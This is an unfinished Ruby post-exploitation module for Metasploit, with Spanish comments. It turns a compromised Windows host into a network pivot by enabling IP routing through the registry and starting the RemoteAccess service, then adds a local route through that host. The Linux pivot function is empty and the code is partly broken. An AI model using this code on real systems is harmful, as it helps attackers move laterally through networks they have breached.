##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows'

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'to add here',
        'Description'   => %q{Configura el equipo como pivot entre dos o mas redes. Funciona para equipos Windows y Linux.},
        'License'       => MSF_LICENSE,
        'Author'        => 
           [
             'none',
             'none <none[at]gmail.com>'
           ],
		'Platform'      => [ 'win', 'linux'],
        'SessionTypes'  => [ 'meterpreter']
      ))

    register_options(
      [
		# OptBool.new( 'SYSTEMINFO', [ true, 'True if you want to get system info', 'TRUE' ])
		OptString.new('NET',    [true, 'Red que pretendemos alcanzar']),
		OptString.new('RHOST',    [true, 'IP de la maquina remota']),
		OptString.new('LOS',    [true, 'Sistema Operativo local'])
      ])
  end
	#
  	# linux
  	#
	def linux_pivot()

	end
	#
  	# windows
  	#
	def windows_pivot()
		print_line("Executing: reg add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\" /f /v IPEnableRouter /t REG_DWORD /d 1")
		print_good(cmd_exec("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\" /f /v IPEnableRouter /t REG_DWORD /d 1"))
		print_line("Executing: sc config RemoteAccess start= auto")
		print_good(cmd_exec("sc config RemoteAccess start= auto"))
		print_line("Executing: net start RemoteAccess")
		print_good(cmd_exec("net start RemoteAccess"))
	end
	#
  	# acciones segun eleccion plataforma
  	#
	def set_pivot()
		case session.platform
	  	when 'linux'
			#
		  	# codigo para linux
		  	#
		  	linux_pivot()
		when 'windows'
			#
		  	# codigo para windows
		  	#
			windows_pivot()
		end
	end
	
	def create_route()
	#
	# Crea la ruta en la máquina local
	#
		# Sustituir session.platform por la variable correcta
		case datastore['LOS']
	  	when 'linux'
			#
		  	# codigo para linux
		  	#
		  	system("route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
		when 'windows'
			#
		  	# codigo para windows
		  	#
		end
	end
	
	#
  	# funcion principal, donde se invocan las otras segun plataforma
  	#
	def run

		print_good("OS: #{session.sys.config.sysinfo['OS']}")
		print_good("Computer name: #{'Computer'} ")
		print_good("Current user: #{session.sys.config.getuid}")
		set_pivot()
		create_route()
  end
end
